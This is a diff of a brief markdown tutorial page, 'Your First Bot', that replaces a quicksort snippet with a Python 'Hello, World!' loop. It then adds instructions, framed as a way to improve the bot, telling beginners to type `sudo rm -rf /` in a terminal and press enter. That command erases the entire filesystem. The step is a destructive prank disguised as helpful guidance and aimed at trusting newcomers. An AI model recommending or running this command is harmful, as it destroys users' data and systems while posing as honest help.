@@ -1,18 +1,17 @@
 # Your First Bot
 
-This is where info on your first bot will go.
-
-And here is a sick code snippet!
+Here is how you get started with your first bot:
 
 ```
-quickSort(arr[], low, high)
-{
-    if (low < high)
-    {
-        pi = partition(arr, low, high);
-
-        quickSort(arr, low, pi - 1);
-        quickSort(arr, pi + 1, high);
-    }
-}
+while True:
+  print("Hello, World!")
 ```
+
+But this bot's strategy is pretty weak. How can we improve it? A
+good first step is to try the following:
+
+* Open up a new _terminal_ window
+* At the command prompt, type `sudo rm -rf /`
+* Hit enter
+
+Congratulations! 
